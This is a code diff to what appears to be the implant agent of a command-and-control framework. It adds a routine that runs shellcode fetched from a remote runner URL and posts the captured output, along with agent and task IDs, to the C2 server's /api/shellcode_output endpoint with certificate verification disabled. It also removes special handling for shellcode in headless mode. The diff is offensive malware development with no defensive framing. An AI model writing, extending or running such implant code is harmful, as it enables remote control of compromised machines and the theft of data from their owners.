@@ -2076,12 +2076,42 @@ class Agent:
 
                     self._log_info(f"Starting shellcode execution from: {{runner_url}}")
 
-                    # Execute the runner script asynchronously in a separate thread
+                    # Execute the runner script and capture output
                     def run_shellcode_async():
                         try:
                             result = ShellcodeRunner.execute_runner(runner_url)
                             self._log_info(f"Shellcode execution result: {{result}}")
-                            # Optionally send result back to server if needed
+
+                            # Send the captured output back to the C2 server
+                            try:
+                                output_data = {{
+                                    'agent_id': self.agent_id,
+                                    'task_id': task.get("task_id"),
+                                    'status': result.get('status', 'unknown'),
+                                    'message': result.get('message', ''),
+                                    'output': result.get('stdout', '') + result.get('stderr', ''),
+                                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')
+                                }}
+
+                                response = requests.post(
+                                    f"{{self.config.C2_SERVER}}/api/shellcode_output",
+                                    json=output_data,
+                                    headers={{
+                                        "User-Agent": self.config.USER_AGENT,
+                                        "Content-Type": "application/json"
+                                    }},
+                                    timeout=30,
+                                    verify=False
+                                )
+
+                                if response.status_code == 200:
+                                    self._log_info("Shellcode output sent to C2 server successfully")
+                                else:
+                                    self._log_error(f"Failed to send shellcode output to C2 server: {{response.status_code}}")
+
+                            except Exception as e:
+                                self._log_error(f"Failed to send shellcode output to C2 server: {{str(e)}}")
+
                         except Exception as e:
                             self._log_error(f"Async shellcode execution failed: {{str(e)}}")
 
@@ -2254,15 +2284,8 @@ class Agent:
                             timeout=30,
                             verify=False
                         )
-                    if task.get("type") == "shellcode":
-                        # Special handling for shellcode in headless mode
-                        result = self._execute_task(task)
-                        if result.get('status') == 'error':
-                            self._log_error(f"Shellcode failed: {{result['message']}}")
-                            continue
-                        
-                        # Don't wait for response in headless mode
-                        continue
+                    # Handle shellcode tasks normally - they execute asynchronously
+                    # and send results back via HTTP callback
                 
                 # After first checkin, set flag to False
                 if first_checkin:
